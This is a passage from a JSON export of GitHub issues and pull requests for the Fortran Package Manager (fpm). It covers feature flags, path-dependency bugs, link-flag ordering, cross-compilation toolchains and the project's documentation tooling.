            "text": "Motivation\nNot all parts of a project are always needed. Many Fortran projects can be build with and without MPI support for example. Currently there is no mechanism to express such features in the package manifest. An option is to rely on preprocessor and set reasonable default using constructs like shown below:\n#ifndef WITH_FEATURE\n#define WITH_FEATURE 0\n#endif\nSince preprocessor might be the easiest way to express project local optional features, we could include such mechanism in fpm.\nSpecification\nA project could declare a features table and export this to the project via a preprocessor variable:\n[features]\nqp.preprocessor = \"WITH_QP\"\nWhen used as a dependency the feature could be toggled using\n[dependencies]\ntest-drive = {git=\"https://github.com/fortran-lang/test-drive\", features=[\"qp\"]}\nPrior Art\nCargo has features: https://doc.rust-lang.org/cargo/reference/features.html\nAdditional Information\nA use case would be fortran-lang/test-drive#7\nThe mechanism required in fpm is similar to the one described in #577 (comment)",
            "comments": [
                {
                    "user": "plevold",
                    "date": "2021-11-19 08:29:11+00:00",
                    "text": "Features would be a great to have in fpm! In my opinion there's two crucial features in Cargo's feature functionality that would be great to see in fpm too:\nOptional dependencies:\nWhen a dependency is marked as optional in Cargo this creates an implicit feature with the same name. In an ecosystem with lot's of packages available eliminating the need to build unused dependencies are just as important as conditionally building parts of the project source code itself.\nFeature dependencies:\nFor a project with many optional features it might be necessary to specify that one feature requires other features to be enabled."
                }
            ]
        },
        {
            "number": 608,
            "user": "urbanjost",
            "date": "2021-11-13 07:02:38+00:00",
            "title": "--env switch lets you specify the prefix of the compiler-related environment variables",
            "text": "This should address #576",
            "comments": [
                {
                    "user": "urbanjost",
                    "date": "2021-11-15 21:42:51+00:00",
                    "text": "manual.pdf\nsince there is extensive reorganization of the help text, here is an Adobe PDF version for review.\nAlso, something like this except want it to get the fpm version from the PR (need some help with this)\nmanpages.yml.txt"
                },
                {
                    "user": "urbanjost",
                    "date": "2021-11-17 14:23:16+00:00",
                    "text": "After using this for a while, I think a more intuitive mode might be that FPM_COMPILER sets the compiler, but all the other values always are of the form FPM_MODIFIER_KEYWORD and that modifier defaults to the current compiler name, but are ignored unless the -env switch is used. If -env is used with no value, the FPM_compiler_name variables are used, if a blank is given as the value the plain keywords are used, if a modifier value is present it is used. That way only FPM_COMPILER is used by default.  Thoughts?"
                },
                {
                    "user": "urbanjost",
                    "date": "2021-11-18 09:17:03+00:00",
                    "text": "After trying several variants this is the most satisfying. It allows for using the \"standard\" variables only as an opt-in, but easily just by using\nfpm  ... --env \"\"\nit allows for named groups of variables to be used and provides an easy syntax for compiler-specific variables. All new variables are ignored by default. All variables begin with the FPM_ prefix. What variables are examined is reflected when the --verbose switch is present. So no newly introduced variables are used inadvertently as they are ignored unless --env is present.\nmanual_0.4.1.html.pdf"
                }
            ]
        },
        {
            "number": 607,
            "user": "urbanjost",
            "date": "2021-11-12 21:59:45+00:00",
            "title": "Repair --list option and correct obsolete descriptions of the --list option",
            "text": "Fixes #606.\n--list now has non-intuitive differences between build --list and [run,test] --list and install --list, as it originally showed the full pathname of targets on all commands.  Not sure if it should be renamed on [run,test]  to --show; or if their should be a --path option specifically for the long names;  but on [run,test] you can still get full pathnames via --runner so no functionality is lost; but\nI do think it is less intuitive what --list does not, as it varies somewhat become subcommands.https://urbanjost.github.io/fpm-tools/manual.html\nDid not add a new test for checking the --list option, but the need for this patch would probably be avoidable if we had one.  Will try to add one in a separate PR, as a good number of features are not tested and we probably could use a separate project to get the tests up to par  (especially since part of the design of fpm is specifically to encourage the development of tests :>).\nTo review the revised help text as HTML see this regenerated version of 'fpm version 0.4.0 manual'",
            "comments": []
        },
        {
            "number": 606,
            "user": "urbanjost",
            "date": "2021-11-12 02:35:08+00:00",
            "title": "listing of targets and --list option is broken",
            "text": "Description\nThe --list option should show full pathnames, and target names should be displayed when multiple targets are present.\nTarget names are not displayed. Instead the directory name appears; and full pathnames are not listed when --list is used\non test or run.\nExpected Behaviour\nThe target names should be displayed when no target is specified and multiple targets are present.\nVersion of fpm\n0.4.0\nPlatform and Architecture\nAll\nAdditional Information\nNo response",
            "comments": []
        },
        {
            "number": 605,
            "user": "plevold",
            "date": "2021-11-11 14:52:10+00:00",
            "title": "Problems declearing local (path) dependencies ",
            "text": "Description\nI'm trying to organize my fpm project with multiple sub-projects, but I'm experiencing some problems which I believe is a bug or at least an ambiguity in the way fpm handles path dependencies.\nSay I have the following projects:\n\nhierarchical (main project with app)\nmylib (library)\nutils (library)\n\nThe dependency tree is as follows: hierarchical -> mylib -> utils\nI expect to be able to build and test the main project and any of the subprojects depending on what I'm currently working on. Examples:\n\nWhen adding new features to mylib I would write code and run fpm test in mylib-s directory\nWhen utilising the new mylib feature in the app I would write code and run fpm test in the main project directory\n\nI've tried the following ways of organizing my code:\n1)\n- <repo>\n    - fpm.toml (main project)\n    - lib/\n        - mylib/\n            - fpm.toml (library)\n        - utils/\n            - fpm.toml (library)\n\n\n\n\n- <repo>\n    - hierarchical/\n        - fpm.toml (main project)\n    - lib/\n        - mylib/\n            - fpm.toml (library)\n        - utils/\n            - fpm.toml (library)\n\n\n\n\n- <repo>\n    - hierarchical/\n        - fpm.toml (main project)\n    - mylib/\n        - fpm.toml (library)\n    - utils/\n        - fpm.toml (library)\n\nSee https://github.com/plevold/fpm-path-bug for the complete set of files.\nThis is what happens with the different folder layouts:\n\nCase 1:\n\nBuild and test mylib: Works fine\nBuild and test main project: Fails with <ERROR>*cmd_run*:model error:'.\\../utils\\fpm.toml' could not be found, check if the file exists\n\n\nCase 2:\n\nBuild and test mylib: Works fine\nBuild and test main project: Fails with <ERROR>*cmd_run*:package error:'fpm.toml' could not be found, check if the file exists\n\n\nCase 3:\n\nBuild and test mylib: Works fine\nBuild and test main project: Works fine\n\n\n\nExpected Behaviour\nI would expect all of these project layouts to work.\nIt seems like what's happening is that fpm resolves the paths relative to the fpm.toml file being built and not the fpm.toml of the path-dependency. This gives different behaviour when I try to build the main project or mylib. In the third case, the relative path from the main project to utils and from mylib to utils is \"by accident\" the same (i.e. ../utils).\nI think fpm should resolve paths relative to the current fpm.toml file being parsed and not the first one. This would make all the different project layouts in my examples work.\nAs a side note there should maybe be a recommended way of organizing projects like this. I'm not sure which way is better, but that's an interesting discussion for sure \ud83d\ude04\nVersion of fpm\n0.4.0\nPlatform and Architecture\nWindows\nAdditional Information\nNo response",
            "comments": [
                {
                    "user": "urbanjost",
                    "date": "2021-11-11 17:07:24+00:00",
                    "text": "If the two libraries and the application are developed independently, the approach is assumed that there are three top project directories, and that the app uses the two other projects as dependencies. The dependencies can be links to the pathnames instead of URLs.\nOr, you just have one fpm.toml at the top of the project, and named tests in the test/ directory that you would call, such as\nfpm test my_utils\nThere could have been changes, but fpm(1) was not initially designed to include subprojects in the same directory except as dependencies. An interesting approach that others might feel should be implemented, but the two schemes described above provide the same functionality, essentially. Which to use mostly depends on whether you want to independently compile and/or reuse the libraries, or want everything to build at once with the same options.\nThere are ways to have the file layout you describe with everything after lib/ but you have to turn off auto-search for sources and explicitly name the files to build; the fact you put files into lib/ instead of src/ means you did something in your fpm.toml file that we need to see if you want to stick with that layout."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-11-11 17:33:35+00:00",
                    "text": "As an example of creating three directories (on a *nix system with bash, but the concept works on all supported platforms)\nand using directory B and C as dependencies of A (A and B do not have to be links, they could be subdirectories contained in A)\n#!/bin/bash\n# assuming you are building library B in directory B and library C in \n# directory C and your directory with an application is in A\nfpm new A\nfpm new B\nfpm new C\ncd A\n# make links to the other projects\nln -s ../B B\nln -s ../C C\n###############################################################################\n# declare the other directories to be dependencies\ncat >>fpm.toml <<\\EOF\n[dependencies]\nB      = { path = \"B\" }\nC      = { path = \"C\" }\n#B      = { git = \"https://github.com/urbanjost/B.git\" }\n#C      = { git = \"https://github.com/urbanjost/C.git\" }\nEOF\n###############################################################################\n# make a program that calls the other projects\ncat >app/main.f90 <<\\EOF\nprogram main\n  use A, only: helloa => say_hello\n  use B, only: hellob => say_hello\n  use C, only: helloc => say_hello\n  implicit none\n\n  call helloa()\n  call hellob()\n  call helloc()\nend program main\nEOF\n###############################################################################\nfpm run\nexit\nThe output should be\n Hello, A!\n Hello, B!\n Hello, C!"
                },
                {
                    "user": "urbanjost",
                    "date": "2021-11-11 18:28:53+00:00",
                    "text": "I think these steps would be closest for what you were originally entertaining:\nmyproject\n    \u251c\u2500\u2500 app\n    \u2502\u00a0\u00a0 \u2514\u2500\u2500 main.f90\n    \u251c\u2500\u2500 fpm.toml\n    \u251c\u2500\u2500 lib\n    \u2502\u00a0\u00a0 \u251c\u2500\u2500 mylib\n    \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 fpm.toml\n    \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 README.md\n    \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 src\n    \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 mylib.f90\n    \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 test\n    \u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u2514\u2500\u2500 check.f90\n    \u2502\u00a0\u00a0 \u2514\u2500\u2500 utils\n    \u2502\u00a0\u00a0     \u251c\u2500\u2500 fpm.toml\n    \u2502\u00a0\u00a0     \u251c\u2500\u2500 README.md\n    \u2502\u00a0\u00a0     \u251c\u2500\u2500 src\n    \u2502\u00a0\u00a0     \u2502\u00a0\u00a0 \u2514\u2500\u2500 utils.f90\n    \u2502\u00a0\u00a0     \u2514\u2500\u2500 test\n    \u2502\u00a0\u00a0         \u2514\u2500\u2500 check.f90\n    \u251c\u2500\u2500 README.md\n    \u2514\u2500\u2500 test\n        \u2514\u2500\u2500 check.f90\n\n#!/bin/bash\nfpm new myproject --test --app\ncd myproject\n# add dependencies\ncat >>fpm.toml <<\\EOF\n[dependencies]\nmylib      = { path = \"lib/mylib\" }\nutils      = { path = \"lib/utils\" }\nEOF\n# make program that uses dependencies\ncat > app/main.f90 <<\\EOF\nprogram main\n    use utils, only: hellob => say_hello\n    use mylib, only: helloc => say_hello\n    implicit none\n   \n    call hellob()\n    call helloc()\nend program main\nEOF\n# make the subprojects\nfpm new utils --src --test\nfpm new mylib --src --test\nmkdir lib\nmv utils mylib lib/\n# run app\nfpm run"
                },
                {
                    "user": "plevold",
                    "date": "2021-11-11 20:04:22+00:00",
                    "text": "the fact you put files into lib/ instead of src/ means you did something in your fpm.toml file that we need to see if you want to stick with that layout.\n\n@urbanjost as mentioned, please see https://github.com/plevold/fpm-path-bug for the complete set of files.\nIn the last example you show your dependency tree looks like this:\nmyproject -> mylib\n          -> utils              \n\nIn the example I show the main project does not depend on utils, but mylib does. I.e. the dependency tree looks like this:\nmyproject -> mylib -> utils\n\nThis triggers the error while your example does not."
                },
                {
                    "user": "LKedward",
                    "date": "2021-11-29 14:32:49+00:00",
                    "text": "cc @awvwgk\nThanks for reporting @plevold. The manifest reference says this about local path dependencies:\n\nLocal dependency paths are given relative to the project root and use / as path separator on all platforms.\n\nIt's not clear which 'project root' that refers to but it would seem that, perhaps counter-intuitively, all such local paths are currently required to be relative to the top-level project root. Of course, this means that the manifests of the intermediate dependencies (e.g. mylib) are non-sensical in the absence of the top-level project.\nAs shown here, this behavior needs changing because the local paths should be relative to the manifest file which defines them and not the top-level project. Would you agree @awvwgk?\nI believe the relevant implementation is in fpm_dependency.f90 but I don't know yet what changes are required."
                },
                {
                    "user": "epagone",
                    "date": "2021-11-29 15:27:22+00:00",
                    "text": "Sorry to chime-in, please hide this message if too much off-topic.\nIf some re-design of the local dependencies implementation will be done, I will ask to consider to allow \"out-of-tree\" local dependencies. E.g. I have a more generic library gen-lib as fpm package that is not pushed to the repository of a remote version control system but that is used by several local projects app1, lib1, app2 in this way\ngen-lib\n    \u251c\u2500\u2500 src\n    \u2502   \u2514\u2500\u2500 *.f90\n    \u2514\u2500\u2500 fpm.toml\n\napp1\n    \u251c\u2500\u2500 app\n    \u2502   \u2514\u2500\u2500 *.f90   <--- use gen-lib\n    \u2514\u2500\u2500 fpm.toml\n\nlib1\n    \u251c\u2500\u2500 src\n    \u2502   \u2514\u2500\u2500 *.f90   <--- use gen-lib\n    \u2514\u2500\u2500 fpm.toml\n\napp2\n    \u251c\u2500\u2500 app\n    \u2502   \u2514\u2500\u2500 *.f90   <--- use gen-lib\n    \u2514\u2500\u2500 fpm.toml\n\nIn this way I can centrally work on gen-lib and then cascade the amendments to app1, lib1, app2, etc...\nI understand that the end result might be a copy or a link of the \"out-of-tree\" dependencies in the project tree, but it would be nice to make this transparent to the fpm user."
                }
            ]
        },
        {
            "number": 604,
            "user": "rouson",
            "date": "2021-11-09 21:26:31+00:00",
            "title": "Split --link-flag",
            "text": "Description\nI believe that fpm's current --link-flag argument needs to be split into two arguments named something like --link-flag (same as before) and --link-lib, where a concatenated list of any --link-lib arguments would be placed at the end of the resulting link line.  The motivating use case is explained below.\nI'm working on a shell-script installer for a new package.  The installer first installs the prerequisite GASNet-EX, which in turn defines several GASNET_* environment variables for use in building and linking against  GASNet-EX.   After installing GASNet-EX on macOS, a fpm command of the following form works to build the new package and link it against GASNet-EX:\nfpm build  \\\n  --c-compile \"$GASNET_CC\" \\\n  --c-flag \"$GASNET_CFLAGS $GASNET_CPPFLAGS\" \\\n  --link-flag \"$GASNET_LDFLAG $GASNET_LIBS\"\n\nwhere  GASNET_LIBS contains the -L and -l flags for linking against GASNet-EX.\nOn Ubuntu, the above command fails, but if I copy the resulting gfortran link command and reuse it with $GASNET_LIBS moved to the tail end, linking succeeds.\nExpected Behaviour\nSuccessful linking.\nVersion of fpm\nc5ef60d\nPlatform and Architecture\nUbuntu via GitHub Action\nAdditional Information\nNo response",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-11-09 21:34:39+00:00",
                    "text": "Preferably we could put libraries we link against in the package manifest under build.link rather than injecting them via the command line options. The --link-flag is mainly meant to add -L flags to find libraries we want to link against from the package manifest or add linker options (like -Wl,-rpath, LTO, ...).\nWould adding the required libraries in build.link be sufficient for your use case?"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-11-09 21:55:29+00:00",
                    "text": "The --link-flag arguments from the model are purposely put in front of the object files here\n\n  \n    \n      fpm/src/fpm_targets.f90\n    \n    \n         Line 517\n      in\n      c5ef60d\n    \n    \n    \n    \n\n        \n          \n           target%link_flags = model%link_flags//\" \"//string_cat(target%link_objects,\" \")"
                },
                {
                    "user": "rouson",
                    "date": "2021-11-09 23:02:27+00:00",
                    "text": "Would adding the required libraries in build.link be sufficient for your use case?\n\nI didn't know about build.link.  I'll try it.  Thanks for the quick reply!"
                },
                {
                    "user": "rouson",
                    "date": "2021-11-19 04:49:40+00:00",
                    "text": "In my use case, building on macOS worked but not on Linux.  @awvwgk, your suggestion works on Linux but breaks the macOS build.  For now, I think we have to come up with a way to use different fpm.toml files on one operating system versus another.   Eventually one of the solutions proposed in issue #611 will likely be best, but it still might be a good idea to also have the option to specify -L and -l arguments separately from other link arguments and have the -L and -l arguments be placed at the end of the link command."
                },
                {
                    "user": "jvdp1",
                    "date": "2021-11-19 06:56:24+00:00",
                    "text": "I agree with @rouson that having the option to specify separately -L and -l in the argumetns would be a nice feature. This could be helpful to support multiple compilers with a same fpm.toml, with the -l argument added to the specified libs in the fpm.toml under [link]."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-11-29 00:32:42+00:00",
                    "text": "Haven't carefully read this discussion yet but I\nalways put -L and -l on the right side of my build objects in order as a result of working with single-pass left-to-right loaders; without trouble; but since multiple -flag options are allowed, perhaps a special option like --place [left|right]  that would indicate the position to place subsequent options would be a stop-gap? Although nearly a standard, not all compilers necessarily use -L and -l so just looking for those flag names might have issues"
                }
            ]
        },
        {
            "number": 603,
            "user": "awvwgk",
            "date": "2021-11-05 09:39:47+00:00",
            "title": "Upload release artifacts without version number",
            "text": "Currently we attach the version number to each release artifact. If we would remove or additionally upload artifacts without the version number (fpm.F90 instead of fpm-0.4.0.F90) it would be possible to always download the latest stable version using:\nhttps://github.com/fortran-lang/fpm/releases/download/latest/fpm.F90\nUsing latest correctly ignores pre-releases as well.",
            "comments": []
        },
        {
            "number": 602,
            "user": "everythingfunctional",
            "date": "2021-11-03 17:29:11+00:00",
            "title": "fix(fpm_compiler): intel windows release flag was incorrect",
            "text": "Fix #601",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2021-11-03 19:58:17+00:00",
                    "text": "Thanks for the reviews guys. With two approvals and this being such a minor change I'm going to go ahead and merge."
                }
            ]
        },
        {
            "number": 601,
            "user": "everythingfunctional",
            "date": "2021-11-03 14:51:16+00:00",
            "title": "Windows Intel default release flag invalid",
            "text": "Description\nOne of the flags used for the built-in release profile for Intel on Windows is not correct.\nSpecifically, /fp-model:precise should just be fp:precise.\nExpected Behaviour\nCompiling using the built-in profiles should have all valid flags.\nVersion of fpm\n0.4.0\nPlatform and Architecture\nWindows\nAdditional Information\nNo response",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2021-11-03 14:51:37+00:00",
                    "text": "I should be able to submit a patch later today."
                }
            ]
        },
        {
            "number": 599,
            "user": "LKedward",
            "date": "2021-11-02 09:11:38+00:00",
            "title": "Start dedicated user documentation site",
            "text": "See #598 (comment).\nThere are lots of options available for generating nice documentation sites.\nOne requirement will be to support multiple versions for each release of fpm.\nAlso will we store the docs in the same repo here or in a separate one?",
            "comments": [
                {
                    "user": "zoziha",
                    "date": "2021-11-02 09:23:04+00:00",
                    "text": "I have used rust-lang/mdbook (see GitHub repo and its Doc website), it uses book.toml to configure markdown documents, we will feel familiar. (mdbook is a potential option)\n\nmdBook is a utility to create modern online books from Markdown files."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-11-02 09:35:41+00:00",
                    "text": "Sphinx+MyST would also be a good option. It can be maintained in a separate subdirectory here and deployed automatically via GitHub actions to fpm.fortran-lang.org."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-11-11 03:11:00+00:00",
                    "text": "The help text of fpm was originally written with the idea of running it through txt2man; and then using man(1) to convert to HTML or dvi and so on, which (with a little editing) produces\nmanual\nas well as man-page files for ULS (*nix) systems.\nI looked for a man-to-markdown  utility with no luck so far. That could be one approach.\nUPDATE: I tried man-to-md but it did not recognize some of the macros generated by txt2man(1); but pandoc(1) looks like it did get close:\nmarkdown\nat first glance, it seems to have a problem with text attributes in fixed text blocks, but close. Might be some simple change needed in txt2man or maybe pandoc(1) has some option or could be fixed.\nAlternatively I was looking for a markdown-to-text converter so the help could alternatively be written as markdown but produce ASCII text that could be included into fpm that was simple enough to be written in Fortran. There are several although I have not tested them yet.\nSo one alternative might be to write the help as markdown, and then have a tool that would convert it into flat text which could easily be converted to INCLUDE files to be placed in the fpm source? There are so many variants of markdown that seems problematic; but anything  available for converting to text could be used (HTML, LaTeX, ....) although that would be a  build dependency for the maintainers, it could perhaps be done via CI/CD when doing a PR.\nGoing back to the original concept, I have txt2man and man2html on my platform so to generate the above only takes\nfpm help manual|txt2man|tee fpm.1|man2html >fpm.html\nusing a modified version of man2html that adds a CSS style sheet.\nThat is all it takes (and currently a small amount of editing that could be scripted on a ULS in a few minutes)  to make a man-page in \"fpm.1\" and the above HTML document."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-11-13 19:19:11+00:00",
                    "text": "Even a brute-force script\nusing groff demonstrates the possible process of automatically generating\na HTML representation of the help text with each PR from a CD/CI script.\ngroff(1) does not produce particularly great results and the CSS style\nsheet could definitely be improved. This is just for demonstration\npurposes, but I think something like this could be used to make on-line\ndocumenation available via the fpm webstite. Not quite sure how to place\nthe results back onto the web page as I have not used an artifact file\nyet, but even if another approach is taken such as mentioned above,\nas long as \"fpm help manual\" produces a man-page-like output this would\ncontinue to work.\nSo just to keep it simple (the CSS style would be inserted correctly using\nsomething like sed(1), and would have to experiment with whether man2html,\npandoc, etc. is best in a CD/CI environment) but does the general concept\nseem like something to go forward with? If so, any suggestions?\nAnyone used man2html(1) in a CD/CI environment?\nWould individual documents be better than a single document?\nShould actual man-pages be generated as well?\nThe one listed above produces better results using a slightly modified man2html,\nbut if anyone has a better CSS page using groff(1) would probably be the easiest\nto maintain.\nI keep meaning to make a Fortran version of txt2man(1) using a RE library but\nnever get around to it, as txt2man(1) works for what I need; but that would be\nan interesting method to create\nA quick bash shell script only using groff(1) (probably in the default environment?)\nand curl(1) (wget would work too) :\nmanual.md\nmight want to run through tidy(1) too if that is easy to put into a CD/CI job."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-11-16 13:23:42+00:00",
                    "text": "manual.yml.txt\nmade a github-actions file that does a wget of some scripts and runs them that successfully generates an HTML document.\nNot a big user of these files (yet?).   How best to get the output file back to a web site,  and so on?\nUPDATE: missed an issue with man2html output. Probably want to add switch to man2html to not generate contents table but\nin meantime, change command to\n fpm manual|txt2man -t 'fpm manual' -s 1 -r \"$VERSION\" |man2html|\\\n           grep -v '^<A HREF=#'|\\\n           grep -v '\\&nbsp;<A HREF=#'|\\\n           grep -v 'name=contents' >artifacts/manual_$VERSION.html\n```bash"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-11-29 20:18:41+00:00",
                    "text": "I started a repository for working on the user documentation at https://github.com/awvwgk/fpm-docs.\nThe documentation is mainly written in the MyST markdown dialect and rendered with sphinx, since I'm building via GitHub actions and deploy to GitHub pages we have the freedom to insert any additional generation steps in the workflow. John @urbanjost, we could try to incorporate the automatically generated markdown versions of fpm's help page in this documentation as well."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-11-30 03:37:44+00:00",
                    "text": "Not familiar with MyST markdown, but if it allows including HTML like github markdown that might give better results. Will take a look at MyST."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-11-30 03:54:50+00:00",
                    "text": "It says commonmark is a subset of MyST so I made a commonmark subdirectory in the fpm-tools/docs directory but I do not have an easy way to test it that I know of.  Do those look good?"
                }
            ]
        },
        {
            "number": 598,
            "user": "rouson",
            "date": "2021-10-29 23:14:49+00:00",
            "title": "Update README.md compiler, archiver, & link flags",
            "text": "This PR completes and updates the README.md description of the above fpm flags to match the description given by fpm build --help.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-11-01 11:02:23+00:00",
                    "text": "I don't think we need a separate branch for development (yet). I prefer to have the repository default branch represent the latest development state of a project. Currently the main branch is always in a state that it can be released, we can do this continuously without tagging releases as well (see #569).\nI think the main issue is that we don't have a dedicated user documentation for the fpm yet (the docs at https://fpm.fortran-lang.org are targeted at developers). Preferably we can setup documentation with tutorials and how-to guides which always provide the last stable and the latest version of the user documentation."
                },
                {
                    "user": "rouson",
                    "date": "2021-11-01 13:07:59+00:00",
                    "text": "One way to mitigate the problem @milancurcic identified is to release more often. In agile sprints, releases happen every 2-3 weeks.  If the main branch is always releasable, there's little downside other than the labor involved, which can be lessened by automated any labor-intensive aspects of releasing."
                },
                {
                    "user": "LKedward",
                    "date": "2021-11-02 09:08:31+00:00",
                    "text": "With two reviews I'll now merge this PR. Thanks everyone."
                }
            ]
        },
        {
            "number": 597,
            "user": "awvwgk",
            "date": "2021-10-21 19:38:51+00:00",
            "title": "Add LFortran optimization flag to release profile",
            "text": "Looks like I didn't add the --fast option for LFortran in the release profile. This patch adds optimization for LFortran.",
            "comments": []
        },
        {
            "number": 596,
            "user": "certik",
            "date": "2021-10-18 23:42:54+00:00",
            "title": "Fortran Language Server for VSCode",
            "text": "Is there one already?\nI would like the language server to provide all methods and variables (derived types, etc.) in a given module in the Outline section in the left. It should be fast (immediate). The C++ language server updates quite slowly, and I think Fortran can be made instantaneous because the language is simpler.\nThe language server should work with fpm to correctly and automatically resolve all project files and dependencies (!) and when use pres F12, it would find the definition in any file (whether project file or dependency) and open it. Thanks to fpm, this should just work and be 100% robust.\nIn terms of compiler support to get this working, what exactly is needed? If somebody has experience with the language server protocol, please get in touch.\nThis is a long term project, but I think it is important to get started, getting it working perhaps on single file projects and then go from there.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2021-10-18 23:49:21+00:00",
                    "text": "Here's the one I use, I think it's popular: https://github.com/hansec/fortran-language-server"
                },
                {
                    "user": "certik",
                    "date": "2021-10-19 00:02:33+00:00",
                    "text": "Nice! How accurate is it? Is it able to find definitions in other files and in dependencies? I think that is what fpm could provide.\nI tried to install the extension: https://marketplace.visualstudio.com/items?itemName=hansec.fortran-ls in VSCode, but it does not to anything, I can't get it to work. I'll report it to them."
                },
                {
                    "user": "milancurcic",
                    "date": "2021-10-19 01:26:25+00:00",
                    "text": "I don't know how accurate it is, I only used that extension for Fortran. I'm a basic user of it and use only autocomplete and hover-on definitions. They work and are good enough for me, from other source files too. I didn't customize the extension in any way.\nYou need to pip install fortran-language-server --user first, maybe that's the problem."
                },
                {
                    "user": "zoziha",
                    "date": "2021-10-19 02:00:56+00:00",
                    "text": "I mainly use vs code. The existing fortran-language-server is written based on python, which can provide me with good code hints and definition jumps, provide all methods and variables (derived types, etc.) in a given module in the Outline section in the left.\nThere are at least three vs code plugins for Fortran worth paying attention to:\n\nModern Fortran (Last updated: 2021/7/29)\nFortran Language Server (Last updated: 2020/10/15)\nFortran IntelliSense (Last updated: 2020/4/8) (need Modern Fortran and Fortran Language Server)\n\n\n\nIn addition, Intel Visual Fortran can only be used in Visual Studio before. Intel OneAPI has recently begun to support the use of OneAPI in VS Code, but currently more support for C and C++, Fortran may not be planned."
                },
                {
                    "user": "certik",
                    "date": "2021-10-19 04:48:10+00:00",
                    "text": "Thanks for that @zoziha. I tried to install the Python pip install fortran-language-server, with and without --user. The problem is probably on my side, but at the same time things should just work and they don't for me. :("
                }
            ]
        },
        {
            "number": 595,
            "user": "zoziha",
            "date": "2021-10-15 15:27:11+00:00",
            "title": "List names without suffix (mainly for Windows).",
            "text": "List names without suffix (mainly for Windows, very small update): suffix=.false.\n\nDescription\nIn Windows, the previous fpm program running fpm test --list (same as fpm run --example --list) will have the suffix:\n Matched names:\ncli-test.exe   fpm-test.exe   help-test.exe  new-test.exe\nWhen I want to query and test cli-test, I hope it is cli-test instead of cli-test.exe, so that I can just copy and paste, such as:\nfpm test cli-test instead of fpm test cli-test.exe.\nCurrent effect\n Matched names:\ncli-test       fpm-test       help-test      new-test  \nBecause this is an update for Windows, another way is to add a current system judgment here, is it worth it?",
            "comments": []
        },
        {
            "number": 593,
            "user": "khaors",
            "date": "2021-10-11 17:24:46+00:00",
            "title": "Testing Failing with gfortran in Windows",
            "text": "Description\nHello. I cloned the repository and compiled successfully fpm with gfortran 10.3 in Windows. When I tried fpm test I got the following error:\nfpm test\n + gfortran -c test\\fpm_test\\test_module_dependencies.f90  -Wall -Wextra -Wimplicit-interface -fPIC -fmax-errors=1 -g -fcheck=bounds -fcheck=array-temps -fbacktrace -fcoarray=single -J build\\gfortran_2A42023B310FA28D -Ibuild\\gfortran_2A42023B310FA28D -o build\\gfortran_2A42023B310FA28D\\fpm\\test_fpm_test_test_module_dependencies.f90.o\ntest\\fpm_test\\test_module_dependencies.f90:3:9:\n\n    3 |     use testsuite, only : new_unittest, unittest_t, error_t, test_failed\n      |         1\nFatal Error: Cannot open module file 'testsuite.mod' for reading at (1): No such file or directory\ncompilation terminated.\n<ERROR> Compilation failed for object \" test_fpm_test_test_module_dependencies.f90.o \"\n<ERROR>stopping due to failed compilation\nSTOP 1\n\n\nExpected Behaviour\nIn previous opportunities fpm test worked without problem.\nVersion of fpm\n0.4.0 alpha\nPlatform and Architecture\nWindows\nAdditional Information\nNo response",
            "comments": [
                {
                    "user": "brocolis",
                    "date": "2021-10-12 01:09:01+00:00",
                    "text": "Hello @khaors, thanks for reporting. I was able to replicate the issue, once. I deleted the build directory, now I can't replicate the issue anymore."
                },
                {
                    "user": "khaors",
                    "date": "2021-10-13 01:47:30+00:00",
                    "text": "@brocolis Thank you very much for your help. I deleted the build directory and now the bug is not present anymore."
                },
                {
                    "user": "LKedward",
                    "date": "2021-10-13 08:04:29+00:00",
                    "text": "Possible duplicate of #463"
                }
            ]
        },
        {
            "number": 592,
            "user": "bitli",
            "date": "2021-10-07 19:21:59+00:00",
            "title": "Support for cross compilation and alternate tool chains",
            "text": "Description\nI built a gcc 10 tools chain to cross compile from WSL2 to ARM (raspberry pi). That works fine with simple projects, using the option --compiler arm-linux-gnueabihf-gfortran , having the alternate tool chain in the path.\nHowever there is a bunch of other tools involved, like ld, ar, gcc which all have arm-linux-gnueabihf- as a prefix, but fpm still use the default command line.\nSome hack are possible (like soft linking ar to arm-linux-gnueabihf-ar) but they are inconvenient and dangerous at best. This is especially visible when cross-compiling fpm, so far I was not able to persuade fpm to compile the c file properly.\nExcept of that problem, for simple programs ,this works fine and allow to develop both the native and cross compile version from the same source.\nPossible Solution\nA way to specify a prefix (possibly with a path) for all tools would solve the immediate problem.\nSome thinking on how to customize the build environment outside of the project description is likely needed.\nAdditional Information\nNo response",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-10-07 19:30:09+00:00",
                    "text": "The latest commit allows to use\nFPM_FC=arm-linux-gnueabihf-gfortran \\\nFPM_CC=arm-linux-gnueabihf-gcc \\\nFPM_AR=arm-linux-gnueabihf-ar \\\nfpm build\n\nto select the toolchain or alternatively via command-line\nfpm build \\\n--compiler arm-linux-gnueabihf-gfortran \\\n--c-compiler arm-linux-gnueabihf-gcc \\\n--archiver arm-linux-gnueabihf-ar\n\nWe don't invoke ld directly, only through one of the compiler wrapper, so this might just work."
                },
                {
                    "user": "bitli",
                    "date": "2021-10-07 20:06:42+00:00",
                    "text": "It works like a charm, sorry, I didn't see that ! Thank you for the prompt answer."
                }
            ]
        },
        {
            "number": 591,
            "user": "bitli",
            "date": "2021-10-06 15:46:31+00:00",
            "title": "External libraries not correctly added to ifort link on windows",
